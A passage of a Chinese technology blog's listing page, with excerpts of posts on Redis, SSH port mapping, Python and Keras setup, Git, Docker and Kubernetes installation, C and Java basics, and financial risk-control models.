8、检查文件系统与磁盘表面是否完好（是否有坏道）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56caee43f791d56feebe76ec35f5e765/" rel="bookmark">
			NoSQL之redis配置及优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一. 关系数据库和非关系数据库1.1 关系型数据库1.2 非关系型数据库1.3 非关系数据库产生背景1.4 Redis 简介 二. Redis安装部署2.1 Redis的安装步骤2.2 编译安装Redis2.3 设置Redis相关配置文件2.4 Redis 进程控制 三. Redis 常用配置文件选项四. Redis 数据库常用命令4.1 redis-cli命令行工具4.2 key 相关命令4.3 redis-benchmark测试工具4.4 Redis多数据库操作 五. Redis 持久化5.1 持久化概述5.2 持久化分类5.3 RDB持久化5.4 AOF持久化 六. Redis性能管理6.1 内存碎片率6.2 内存使用率6.3 回收key 一. 关系数据库和非关系数据库 1.1 关系型数据库 一个结构化的数据库，创建在关系模型基础上一般面向记录包括
oracle MySQL SQL Server, Microsoft Access, DB2 1.2 非关系型数据库 除了主流关系型数据库外的数据库，都认为是非关系型包括
Redis, MongBD, Hbase, CouhDB 等 1.3 非关系数据库产生背景 High performance-------对数据库高并发读写需求Huge Storage----------对海量数据高效存储与访问需求High Scalability &amp;&amp; High Availability------对数据库高可扩展性与高可用性需求 1.4 Redis 简介 二.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/56caee43f791d56feebe76ec35f5e765/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/770723589e4cdc633f379bea5c364aa9/" rel="bookmark">
			通过路由器端口映射，对局域网内服务器进行ssh登录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求分析 多台服务器连在同一个路由器下，其中一台进行认证上网，其他服务器也可以正常上网。但是，路由器下机器的IP均由路由器自动分配，这个IP在外网是无法访问到的（也就是只有连在这个路由器下的机器之间可以相互访问）其他可上网的电脑均访问不到，即使进行上网认证的那台机器也不能被外网访问到。
解决方法 对该路由器下的每台机器进行端口映射（类似内网穿透）
原理 由于路由器的外网IP(入口IP)仅有一个，因此访问此IP是无法找到该路由器下的机器的，但通过为每台机器手动分配一个外部端口后，ssh登录时指定要访问的机器的服务端口，就可以找到路由器下对应的机器，进而登录到电脑。
具体方法 进行IP与MAC绑定： 防止IP变动：
对于TP-Link路由器，在【IP与MAC绑定】下启动ARP绑定，并在ARP映射表中启动要绑定的机器。
配置端口映射： 2.1 查询入口IP：查询该路由器获取到的IP地址，这是用于访问路由器下每台机器的IP地址。
2.2 配置端口映射：选择【转发规则】-&gt;【虚拟服务器】，添加条目，配置内容及解释如下：
服务(外部)端口：用于找到哪台服务器的端口，即ssh访问机器时，需要指定的端口，尽量在9000以上。内部端口：由于我们要使用ssh登录，因此这里指定ssh登录的默认端口22.IP地址：由路由器为每台机器分配的IP，在【DHCP服务器】-&gt;【客户端列表】中查询每台机器对应的IP。协议：选择 “ALL” 即可
ssh登录命令： 登录命令: ssh username@入口IP -p 端口号 例如：ssh zguo@115.24.161.110 -p 9085 参考链接1:外网ssh访问路由器内的ubuntu服务器
参考链接2:[传统界面] 虚拟服务器设置指导
如遇问题欢迎进行留言，相互讨论学习。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/978081195d3e60214fb313a9f6c00726/" rel="bookmark">
			7-4 jmu-Java-01入门-取数字浮点数 (2分) JAVA
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 7-4 jmu-Java-01入门-取数字浮点数 (2分)
本题目要求读入若干以回车结束的字符串表示的整数或者浮点数，然后将每个数中的所有数字全部加总求和。
输入格式: 每行一个整数或者浮点数。保证在浮点数范围内。
输出格式: 整数或者浮点数中的数字之和。题目保证和在整型范围内。
输入样例: -123.01 234 输出样例: 7 9 实现 import java.util.Scanner; public class Main { public static void main(String[] args) { Scanner scan = new Scanner(System.in); while (true){ float n = Math.abs(scan.nextFloat()); String s = Float.toString(n); int sum = 0; for (int i=0;i&lt;s.length();i++){ if (s.charAt(i)!='.'){ sum = sum + Integer.valueOf(String.valueOf(s.charAt(i))); } } System.out.println(sum); } } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c492bc815fb19cd7f40288b4ac7dd19/" rel="bookmark">
			bundle fusion代码精讲
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言
慕尼黑工大的bundlefusion开发至少超过数年时间，至今在RGBD类型的开源项目中依然是性能较佳的存在
原版在Windows环境中完成，且不易移植到其他框架中，东北大学的关老师做了Linux环境的移植，还在进行中
笔者在slam领域历时不久，且欣喜此份代码的高完成度和实时性，决定对各个模块逐一注释修改，希望将来有所启迪
1，FriedLiver/Source/FriedLiver.cpp
工程编译的main函数在此其中zParametersDefault.txt zParametersBundlingDefault.txt被定义为抽取的配置文件
根据代码可以./FriedLiver 或者./FriedLiver zParametersDefault.txt zParametersBundlingDefault.txt执行
这里调用的ParameterFile 格式的类专门读取储存配置文件 和增删改查
parameterFile.h中ml空间中用一个类ParameterFile 定义了对文件读取和使用方法
GlobalAppState.h中有个
private:
bool m_bIsInitialized;
ParameterFile m_ParameterFile; 此次可以储存定义过得的数据类型
//ID3D11Query* m_pQuery;
回到FriedLiver.cpp main函数中：
//Read the global app state
ParameterFile parameterFileGlobalApp(fileNameDescGlobalApp);// 初始化默认配置
std::ofstream out;
GlobalAppState::getInstance().readMembers(parameterFileGlobalApp); //读入配置
//Read the global camera tracking state
ParameterFile parameterFileGlobalBundling(fileNameDescGlobalBundling);// 初始化融合配置
GlobalBundlingState::getInstance().readMembers(parameterFileGlobalBundling); //读入配置
//Gpu方法的初始化
DualGPU&amp; dualGPU = DualGPU::get(); //needs to be called to initialize devices 这用了引用的小方法，可以节省资源
dualGPU.setDevice(DualGPU::DEVICE_RECONSTRUCTION); //main gpu 这个GPU是固定的，很奇怪，为什么不适用cuda多GPU方法
//线程初始化
ConditionManager::init();
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c492bc815fb19cd7f40288b4ac7dd19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2f53c29375a48ec779913cd59556752/" rel="bookmark">
			Python安装教程（新手）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一次接触Python，可能是爬虫或者是信息AI开发的小朋友，都说Python 语言简单，那么多学一些总是有好处的，下面从一个完全不懂的Python 的小白来安装Python 等一系列工作的记录，并且遇到的问题也会写出，让完全不懂的小白也可上手安装，并且完成第一个Hello world代码。
[Python 安装] 目前，Python有两个版本，一个是2.x版，一个是3.x版，这两个版本是不兼容的。由于3.x版越来越普及，我们的教程将以最新的Python 3.9版本为基础。
进入Python的官方下载页面
http://www.python.org/download/
出现很多版本的，我们选择最新的版本3.9.0
下载完成后点击运行，会出现安装界面，记得勾上
出现这个就安装成功了
运行Python
安装成功后，打开命令提示符窗口（win+R,在输入cmd回车），敲入python后，会出现两种情况：
情况一：
出现这个表示python安装成功。你看到提示符 &gt;&gt;&gt; 就表示我们已经在Python交互式环境中了，可以输入任何Python代码，回车后会立刻得到执行结果。现在，输入exit()并回车，就可以退出Python交互式环境（或直接关掉命令行窗口也可以）。
情况二： 得到一个错误：
我这里就不演示了，因为我是安装成功的，我还是演示一下，用错误的pythonn来代替python来用，这样才会提示出错误信息。
配置环境变量
这是因为Windows会根据一个Path的环境变量设定的路径去查找python.exe，如果没找到，就会报错。如果在安装时漏掉了勾选Add Python 3.9 to PATH，那就要手动把python.exe所在的路径添加到Path中。
如果发现忘记勾选或者是不会设置PATH路径那么，你重新安装一遍记得勾选上Add Python 3.9 to PATH就ok了。(第2步：出现错误的信息一般都是没有配置环境变量导致的)
步骤：右键我的电脑–&gt;选择属性–&gt;选择高级系统设置–&gt;选择右下角的环境变量
环境变量主要有用户变量和系统变量，需要设置的环境变量就在这两个变量中
用户变量是将自己的下载的程序可以在cmd命令中使用，把程序的绝对路径写到用户变量中即可使用
5. 测试输出
win+R ，输入cmd 回车
输入python回车，进入python开发环境
.
需要注意的是调用函数（打印 等）需要括号，不然会提示
直接在print后面加一段文字来输出的话，需要给文字加上双引号或者单引号。大家发现，print除了打印文字之外，还能输出各种数字、运算结果、比较结果等。你们试着自己print一些别的东西，看看哪些能成功，哪些会失败，有兴趣的话再猜一猜失败的原因。
.
其实在python命令行下，print是可以省略的，默认就会输出每一次命令的结果。就像这样：
[ 安装开发工具 ] 安装PyCharm工具，网上可以下载，很多资源，也有免安装的版本，解压就可以用，我现在演示的是需要进行安装的Pycharm开发工具。
.
.
.
.
.
第一次打开pycharm会显示这个
这样选着会有一个venv文件夹，新建项目时默认是新建一个虚拟环境
不需要venv的虚拟环境文件夹，选着第二个选项并且设置python的环境，默认是没有的哦
点击下一步完成空项目的创建
创建一个文件夹用于分类管理
创建一个python文件里面可以写python语句
来运行一下python代码，打印第一句python代码，Hello World 哈哈哈！！！
pyCharm的插件 汉化插件的下载
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2f53c29375a48ec779913cd59556752/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ee1eafee628e259a14fd15ba46d8c5c/" rel="bookmark">
			解决C4D连接对象＋删除不能用 灰色的点不了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C4D连接对象＋删除不能用，灰色的点不了。如图
问题
连接对象＋删除不能用 是灰色的点不了
解决方法
在空白组上点击一下鼠标中键，再右键就有连接+删除了以上就是MacW小编为大家带来的“解决C4D连接对象＋删除不能用 灰色的点不了”，本文关键词：“C4D常见问题,c4d灰色不能点,c4d教程”。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ea1059367aa83500a142f4e49e66804/" rel="bookmark">
			高级shell扩展---uniq命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		uniq uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用。
语法 uniq [-cdu][-f&lt;栏位&gt;][-s&lt;字符位置&gt;][-w&lt;字符位置&gt;][--help][--version][输入文件][输出文件] 参数： -c或--count 在每列旁边显示该行重复出现的次数。 -d或--repeated 仅显示重复出现的行列。 -f&lt;栏位&gt;或--skip-fields=&lt;栏位&gt; 忽略比较指定的栏位。 -s&lt;字符位置&gt;或--skip-chars=&lt;字符位置&gt; 忽略比较指定的字符。 -u或--unique 仅显示出一次的行列。 -w&lt;字符位置&gt;或--check-chars=&lt;字符位置&gt; 指定要比较的字符。 --help 显示帮助。 --version 显示版本信息。 [输入文件] 指定已排序好的文本文件。如果不指定此项，则从标准读取数据； [输出文件] 指定输出的文件。如果不指定此选项，则将内容显示到标准输出设备（显示终端）。 实例 使用uniq 命令删除重复的行
[root@localhost aaa]# sort string.txt aaa a aaa a aaa a bbb b bbb b ccc c [root@localhost aaa]# sort string.txt |uniq aaa a bbb b ccc c 统计重复行的次数
[root@localhost aaa]# sort string.txt |uniq -c 3 aaa a 2 bbb b 1 ccc c 在文件中找出重复的行
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ea1059367aa83500a142f4e49e66804/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93c19b4b66a34e8953496b7b86fe1f16/" rel="bookmark">
			干货分享：计算机二级考试C语言基础知识，送给考二级的同学！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一章 数据结构与算法
1.1 算法
1.算法的基本概念
如果你在学习C/C++的过程中遇到了问题，可以来加入小编的企鹅圈问小编哦~小编很热情的(●’◡’●)
(1) 概念：算法是指一系列解决问题的清晰指令。
(2) 4个基本特征：可行性、确定性、有穷性、拥有足够的情报。
(3) 两种基本要素：对数据对象的运算和操作、算法的控制结构(运算和操作时问的顺序)。
(4) 设计的基本方法：列举法、归纳法、递推法、递归法、减半递推技术和回溯法。
2.算法的复杂度
(1) 算法的时间复杂度：执行算法所需要的计算工作量。
(2) 算法的空间复杂度：执行算法所需的内存空间。
1.2 数据结构的基本概念
数据结构指相互有关联的数据元素的集合，即数据的组织形式。其中逻辑结构反映数据元素之间逻辑关系;存储结构为数据的逻辑结构在计算机存储空间中的存放形式，有顺序存储、链式存储、索引存储和散列存储4种方式。
数据结构按各元素之间前后件关系的复杂度可划分为：
(1) 线性结构：有且只有一个根节点，且每个节点最多有一个直接前驱和一个直接后继的非空数据结构。
(2) 非线性结构：不满足线性结构的数据结构。
1.3 线性表及其顺序存储结构
1.线性表的基本概念
线性结构又称线性表，线性表是最简单也是最常用的一种数据结构。
2.线性表的顺序存储结构
元素所占的存储空间必须连续。
元素在存储空间的位置是按逻辑顺序存放的。
3.线性表的插入运算
在第i个元素之前插入一个新元素的步骤如下：
步骤一：把原来第n个节点至第i个节点依次往后移一个元素位置。
步骤二：把新节点放在第i个位置上。
步骤三：修正线性表的节点个数。
在最坏情况下，即插入元素在第一个位置，线性表中所有元素均需要移动。
4.线性表的删除运算
删除第i个位置的元素的步骤如下：
步骤一：把第i个元素之后不包括第i个元素的n-i个元素依次前移一个位置;
步骤二：修正线性表的结点个数。
1.4 栈和队列
1.栈及其基本运算
(1) 基本概念：栈是一种特殊的线性表，其插入运算与删除运算都只在线性表的一端进行，也被称为“先进后出”表或“后进先出”表。
栈顶：允许插入与删除的一端。
栈底：栈顶的另一端。
空栈：栈中没有元素的栈。
(2) 特点。
栈顶元素是最后被 插入和最早被删除的元素。
栈底元素是最早被 插入和最后被删除的元素。
栈有记忆作用。
在顺序存储结构下，栈的插入和删除运算不需移动表中其他数据元素。
栈顶指针top动态反映了栈中元素的变化情况
(3) 顺序存储和运算：入栈运算、退栈运算和读栈顶运算。
2.队列及其基本运算
(1) 基本概念：队列是指允许在一端进行插入，在另一端进行删除的线性表，又称“先进先出”的线性表。
队尾：允许插入的一端，用尾指针指向队尾元素。
排头：允许删除的一端，用头指针指向头元素的前一位置。
(2) 循环队列及其运算。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/93c19b4b66a34e8953496b7b86fe1f16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9732e0c7e12db575d4de41f942c7ce4f/" rel="bookmark">
			搭建主从数据库出现的错误error connecting to master ‘user@mysql1:3306‘ - retry-time: 60  retries: 86400
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在搭建主从数据库的时候出现了报错
出现错误的截图：
解决办法：
重新授权
grant replication slave on *.* to 'user'@'mysql2' identified by 'root'; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90f70fe81162153302d12fa1cea4b263/" rel="bookmark">
			洛谷题解，很详细&#43;动画图文
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内容来源于微信公众号：大神编程。已经过原文作者授权。
更新时间：2020-11-5
官方今天开始更新了，很期待！
个人感言：从未见过如此详细的题解，动画、图文结合，适合任何水平的选手。尤其是特别适合自学的。有这么详细的题解，就算没有老师也没问题。甚至比我以前的老师讲的都详细。
为什么要转载：
动画、图文结合。我看了部分文章，一些我觉得很简单的题，但从中学到了以前没有学过的知识点和细节，重点是从中学习别人思维方式。让更多的同学能学到更多的知识。 官方的QQ群：893157498（已取消，有微信群）
【入门1】顺序结构 P5703 【深基2.例5】苹果采购
101【入门2】分支结构
102【入门3】循环结构
103【入门4】数组
104【入门5】字符串
105【入门6】函数与结构体
106【算法1-1】模拟与高精度
107【算法1-2】排序
108【算法1-3】暴力枚举
109【算法1-4】递推与递归
110【算法1-5】贪心
111【算法1-6】二分查找与二分答案
112【算法1-7】搜索
113【数据结构1-1】线性表
114【数据结构1-2】二叉树
115【数据结构1-3】集合
116【数据结构1-4】图的基本应用
117【数学1】基础数学问题
200【算法2-1】前缀和与差分
201【算法2-2】线性复杂度优化 / 离散化
202【算法2-3】分治
203【算法2-4】倍增
204【算法2-5】搜索剪枝策略
205【数据结构2-1】二叉堆与 ST 表
206【数据结构2-2】线段树与树状数组
207【图论2-1】基础树上问题
208【图论2-2】最短路
209【图论2-3】最小生成树
210【图论2-4】连通性问题
211【动态规划1】动态规划的引入
212【动态规划2】线性状态动态规划
213【动态规划3】区间与环形动态规划
214【动态规划4】树与图上的动态规划
215【动态规划5】状态压缩动态规划
216【数学2-1】整数与除数
217【数学2-2】组合数学与计数
218【数学2-3】概率与统计
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/151c311117034cf6fb08d4303cc292f1/" rel="bookmark">
			Git命令： rebase 和 squash命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		rebase的用法
普通合并代码容易产生merge提交
如：
把主干代码合到个人开发分支（有可能会产生一次merge提交)
当前分支：master_zhang3
执行：git merge master
采用rebase
把主干代码合到个人开发分支，并会把master_zhang3分支的提交拉到最近一个节点
当前分支：master_zhang3
git merge master --rebase
比如master有提交点 1,2,3
此时master_zhang3分支有 1，2，4
结果：1,2,3,4
squash用法
branch1（当前分支) 1,2,3,4,5
branch2 1，2，6,7,8,
在branch2里执行：git merge branch1 --squash
结果1,2,6,7,8,9
这里的9是把3,4,5的提交压缩成一个放到branch2的最后一个提交点
回退提交
hard回退
回退之后提交点的代码改动也会丢失（慎用）
回退一次
git reset --hard HEAD^
回退两次
git reset --hard HEAD^^
soft回退
注：回退之后提交节点丢失，但是代码改动保留
回退一次
git reset --soft HEAD^
回退两次
git reset --soft HEAD^^
补提交
git commit --amend
比如：当前分支有1,2,3
执行git commit --amend
1,2,3 最近改动都补提交到3上
覆盖远程分支(慎用)
该命令会强行把本地的提交同步到远程
git push origin HEAD:master_zhang3 --force
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/151c311117034cf6fb08d4303cc292f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3dff1763f02310380b5656cf914afbce/" rel="bookmark">
			Jcenter上传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		添加依赖 classpath 'com.jfrog.bintray.gradle:gradle-bintray-plugin:1.8.5' 添加 Maven apply plugin: 'maven-publish' // 执行 ./gradlew mixing:publishAllPublicationsToMavenRepository // Because the components are created only during the afterEvaluate phase, you must // configure your publications using the afterEvaluate() lifecycle method. afterEvaluate { publishing { repositories { maven { // change URLs to point to your repos, e.g. http://my.org/repo url = "../repo/" } } publications { // Creates a Maven publication called “debug”. MyPublication(MavenPublication) { from components.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3dff1763f02310380b5656cf914afbce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75392eaa02b2b82e36028fae5ec110c3/" rel="bookmark">
			K8S基础项目配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		K8S
之前安装过docker需进行卸载
yum -y remove docker docker-common docker-selinux docker-engine docker-engine-selinux container-selinux docker-ce
或者
yum -y remove docker*
#删除所有的镜像、容器、数据卷、配置文件等
sudo rm -rf /var/lib/docker
查看安装的docker相关软件 卸载情况 yum list installed | grep docker
用国内阿里云安装
Set up repository sudo yum install -y yum-utils device-mapper-persistent-data lvm2
Use Aliyun Docker sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
查看指定版本 yum list docker-ce --showduplicates
安装指定版本 yum install -y --setopt=obsoletes=0 docker-ce-17.03.2.ce-1.el7.centos.x86_64 docker-ce-selinux-17.03.2.ce-1.el7.centos.noarch
不指定版本号 默认安装最新版 sudo yum install docker-ce
一、K8s快速部署 节点规划
k8s-m :10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75392eaa02b2b82e36028fae5ec110c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ffcb6f7bf4d8f25a9cc725dd938cdbb/" rel="bookmark">
			结构体的三种定义方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.单独定义 //先定义结构体再定义变量 struct students{ int age; string name; }; struct studengts s1,s2; 2.混合定义 struct students{ int age; string name; }s1,s2; 3.无类型名定义 struct{ int age; string name; }s1; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a37a5577edc4019ec6d4c99e01dd3e63/" rel="bookmark">
			idea上git提交忽略部分目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 网上比较流行的方法是 在editor中修改file types，把要修改的目录加到 ignore file and folders中，打算我要把resource整个目录都忽略掉，如果把resources;加到里面。在project中也不显示这个目录了。这就是问题所在。
解决 在git的工具栏中，选Changelists --》new Changelist,随便写个名字，然后提交，在提交的也右键不需要提交的目录或文件，选 move files to another changelist ，在弹窗中选择刚才新建的那个名字。这样，项目的内容就被分成了两部分。我们每次提交只选择我们要提交的那个changelist就行了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e20a5498f97a68d8b2d91e49e607378/" rel="bookmark">
			互联网金融风控模型大全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、市场调研
目前市面主流的风控模型
1、互联网金融前10名排行榜(数据截止日期2017-09-12)
互联网金融公司排名分别是蚂蚁金服、陆金所、京东金融、苏宁金融、百度金融、腾讯理财通、宜信、钱大掌柜、万达金融和网易理财。
1.1 蚂蚁金服
1.1.1 大数据技术
对接第三方征信公司芝麻信用分，通过用户信用历史、行为偏好、履约能力、身份特质、人脉关系五个维度对海量数据行综合的处理评估，同时也给予阿里电商交易和蚂蚁金服互联网金融交易数据，对接公安系统和第三方数据公司建立联系。(这块就是用户画像的作用，投资人画像，融资企业/个人 画像，这块的内容比较复杂。后面一定会展开分析，风险定价，推荐系统全部靠它了)
1.1.2 人脸识别技术
人脸识别技术核心算法分别是活体检测算法、图像脱敏算法以及人脸比对算法，国际公开人脸数据库 LFW 上，人脸识别算法准确率(99%)。(像这块的技术已经很成熟有百度都已经推出成型产品，可以通过人脸识别对融资企业/法人进行风险验证，是否存在风险欺诈，多头借贷等嫌疑)
1.1.3 云计算技术
是一个开放的云平台，它助力金融创新、助力金融机构的IT架构实现升级，去构建更加稳健安全、低成本、敏捷创新的金融级应用。(其实就高可用，可靠性等)
1.1.4 风控技术
历史交易数据进行个性化的验证，提高账户安全性。80%左右的风险事件在智能风控环节就能解决。除了事后审核，事前预防、事中监控也非常重要——事前,将账户的风险分级，不同账户对应不同风险等级；事中，对新上线的产品进行风险评审以及监控策略方案评审。(解决80%的问题因此这块才是真正的核心。贷前，贷中，贷后等方方面面的监控，贷前最为重要，如何去检测，抓取哪些数据，与哪些第三方平台合作)
1.1.5 人工智能技术
蚂蚁金服通过大数据挖掘和语义分析技术来实现问题的自动判断和预测。可以识别到用户的身份信息,总结在大的用户层面大家可能都会遇到的问题，100%的自动语音识别。智能质检能力与智能赔付能力，具备了品质的判断能力以及情感判断能力。(总结:公司 PC 的人工语言不完善，很多关键字无法识别。这块应该跟后台没有交互，数据都是写死。移动端也可以考虑在标的详情页介入 draglayout 控件进行智能语音服务，解答用户疑惑。技术核心应该是在数据挖掘，语义分析技术等方式)
1.2 陆金所风控调研
1.2.1 七步风控体系
1、风险政策制度框架体系：所有交易对手和产品引入都制定了明晰的风险政策指引，所有业务必须在制度框架内运行。(说白了就是自己风控业务流程，对于投资人者以及融资用户进行风险等级划分)
2、信用评级：交易对手和产品进行主体评级及债项评级。(对于投资人者、融资用户、产品进行风险等级划分)
3、信息披露：针对每一个不同的产品，将其内部评级、底层资产、主要风险、还款来源、保障措施。(就目前风险披露数据只是按照国家要求进行风险披露，但是并没有标地产品进行风险披露，融资企业进行风险披露，这个披露系统可以做成风险评估报告，后期也可以利用企业供应链关系库一定会用到(但是这部分数据都是针对上市而言，数据不全；))
4、投后预警监控：所有在售资产至少每三个月进行一次检视。(对于融资周期过长的企业可以每三个月进行企业经营状况的上报，重点在于资金用途，回款方式以及周期；如果我们企业够强大的话，可以利用大数据征信对于那些未按时回款融资企业用户的企业进入黑名单系统)
5、风险管理系统：陆金所的风险管理系统覆盖全产品线、整个产品生命周期，实现风控的标准化、智能化、模型化，大幅提升陆金所风险管理工作的效率和效果。(这些东西都太虚了)
6、风险评价体系：同的风险程度给予业务部门不同的业绩评价。
7、资产、资金的精准匹配：投资者进行风险分类，产品与投资者风险适配系统，确保投资者都能买到适合其投资风格与风险偏好的产品。(个人认为这个才是风控的意义，还有我们平台本身存在的价值；具体的实现的方式，利用画像技术对于投资用户，融资用户，标的产品进行风险等级划分，通过数据挖掘进行实时推荐)
小结
风险评级分为三部分：投资人风险等级分类，融资企业信息等级分类，标的产品等级划分。
投资人等级划分：可以参考以往投资标的的利率，投资金额，投资人的站岗资金，投资人的提现金额，也可以通过投资人基本个人信息，例如移动设备Android 或 IOS，年龄，居住地，职业，评判投资人也可以调用第三方平台去综合判断投资的经济状况等方面维度
融资企业等级划分：企业所在行业的整体现状，国家政策是否扶持，企业的纳税证明，银行流水，公司规模，注册资本等维度
标的产品 ：项目所属行业，项目的整体周期，项目成本，利润率，项目的合作企业，项目合同，发票等内容等维度
投资用户与产品匹配度
根据风险评级系统去高度匹配融资用户，产品标的的内容信息。这部分用到的应该是数据挖掘，推荐系统。根据用户以往投资标的金额，利率进行离线推荐，也可以根据用户的点击流日志分析去进行实时推荐，在某个标的详情页的停留时间，标的的点击次数信息。
1.3 京东金融风控调研
1.3.1 用户支付瞬间需要做的事情
如判断用户的设备信息、登录行为、访问特征、信用状况、商品信息、商家特征、配送区域、银行卡状态等。如建立信用、反欺诈、伪冒交易等一系列模型，其中多达近百项的模型需实时计算。这样庞大的运算量在一秒内，甚至几十毫秒内完成，不是易事。 (感觉这些内容任何一点都够我研究一段时间的)
1.3.2 风控的灵魂是数据，所有决策都以数据为驱动
1、业务系统产生的数据和点击流作为主要挖掘的素材来源；但是随着时间推移，恶意用户可以模仿真实用户。因此才会用设备指纹识别，生物探针，语音识别，人脸识别等。
2、风控模型
原始层数据： 由于原始数据存在杂乱无章的现象，此处使用各种颜色来示意
数据原子化： 数据原子化是经过整理后，把数据按业务归属分类，形成最原子的类别，比如账户，资金，投资，消费等
数据抽象层： 按风控关注的业务做数据整合，这层是最贴近业务的。每一块代表一类业务，一个原子数据类是可以被放入多个抽象数据块里的
数据模型层： 对分析场景使用的，基本就是一个数据模型块对应一个分析场景。
3、机器学习在京东金融的天盾风控系统应用
根据经验，在算法的选择上尽可能的多做选择，对比模型的性能择优选取。另外，对样本库做好治理工作，可使用随机抽样和使用聚类把样本数据分层抽取。这些工作是建模人员在大数据环境中也就是离线做的，那么，怎么把训练的模型应用到线上做实时呢，下图是架构：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e20a5498f97a68d8b2d91e49e607378/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1014dd39a0896862a36fe72e99f38633/" rel="bookmark">
			DNN：基于Keras对手写数字的识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DNN：基于Keras对手写数字的识别 Keras和TensorFlow的安装及常见故障处理Keras和TensorFlow的安装常见故障处理 编程实现运行结果 Keras和TensorFlow的安装及常见故障处理 Keras和TensorFlow的安装 1、在anaconda prompt中输入conda create -n keras创建keras环境
2、输入conda activate keras激活创建的环境
3、输入conda install tensorflow 安装TensorFlow，询问处输入y即可安装
4、创建的keras环境中若无Spyder，需要在keras环境中输入 conda install spyder进行安装
常见故障处理 1、若conda install 中出现PackagesNotFoundError,可采用pip install 进行替代，不过pip不支持断点续传，如果网络不好，可能出现下载到一半突然中断的现象，如下图所示：
找个好点的网络即可解决,也可以使用国内的豆瓣镜像源进行下载。
2、若在Spyder中运行程序时出现Keras need TensorFlow 2.2 or higher,但是明明已经下了2.2或更高的版本，说明可能电脑里装了两个或以上TensorFlow，可以将所有的TensorFlow都卸载干净再装需要的版本。
3、若在Spyder中运行程序时出现AttributeError: module ‘tensorflow.python.framework.ops’ has no attribute ‘_TensorLike’，是Keras和TensorFlow的版本不匹配，可参照下面的链接选择Keras、TensorFlow和Python三者均匹配的版本。
List of Avaliable Environments
编程实现 导入需要的库和数据。
from keras.datasets import mnist from keras import models from keras.layers import Dense from keras.utils import np_utils (X_train,y_train),(X_test,y_test) = mnist.load_data() 由于每一个手写数字是一个二维的矩阵，在建立神经网络之前需要将其转化为一维的向量，并将其归一化。
num_pix = X_train.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1014dd39a0896862a36fe72e99f38633/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d7c82a5233f94ca47afe43bfa6840f5/" rel="bookmark">
			跟着狂神SpringBoot融合异步,定时,邮件任务&#43;Maven拓展MailUtils
			</a>
		</h2>
		
	</header>
